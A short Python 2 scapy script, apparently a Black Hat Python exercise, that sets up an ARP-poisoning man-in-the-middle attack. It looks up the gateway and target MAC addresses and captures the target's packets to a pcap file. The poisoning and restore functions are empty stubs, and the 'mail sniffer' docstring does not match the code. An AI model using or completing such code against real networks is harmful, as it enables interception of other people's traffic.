#!/usr/bin/env python
'''mail sniffer'''

from scapy.all import *
import os
import threading
import signal

import sys
import argparse

def getargs():
    '''parse the command line arguments'''
    # process the command line
    parser = argparse.ArgumentParser(description='BHP ARPer')
    parser.add_argument('gateway', help='The gateway to spoof')
    parser.add_argument('target', help='The target of the attack')
    parser.add_argument('-c', '--count', default=1000, help='number of packets to observe')
    parser.add_argument('-i', '--interface', default='eth0', help='interface to use')

    result = parser.parse_args()
    #print result
    return result
def get_mac(ip_addr, dest='ff:ff:ff:ff:ff:ff', timeout=2, retry=10):
    '''get the mac address'''
    response, unanswered = srp(Ether(dst=dest)/ARP(pdst=ip_addr), timeout=timeout, retry=retry)
    for s, r in response:
        return r[Ether].src
    return None

def getmac(name, ip_addr, confirm=True):
    '''Get mac address with optional confirmation'''
    result = get_mac(ip_addr)
    if result is None:
        print '[!!!] Failed to get %s MAC for IP "%s". Exiting.' % (name, ip_addr)
        sys.exit(1)
    elif confirm:
        print '%s %s is at %s' % (name, ip_addr, result)
    return result

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    '''poison'''
    pass
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    '''restore the arp setup'''
    pass

def main():
    '''main'''
    ns = getargs()
    gateway_ip = ns.gateway
    target_ip = ns.target
    count = ns.count
    interface = ns.interface
    print (gateway_ip, target_ip, count, interface)

    # set our interface
    conf.iface = interface

    # turn off output
    conf.verb = 0

    print '[*] Setting up %s' % interface
    gateway_mac = getmac('Gateway', gateway_ip, True)
    target_mac = getmac('Target', target_ip, True)

    poison_thread = threading.Thread(target=poison_target,
                                     args=(gateway_ip,
                                           gateway_mac,
                                           target_ip,
                                           target_mac))
    poison_thread.start()

    try:
        print '[*] Starting sniffer for %d packets' % count
        bpf_filter = 'ip host %s' % target_ip
        packets = sniff(count=count, filter=bpf_filter, iface=interface)
        wrpcap('arper.pcap', packets)

        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

main()
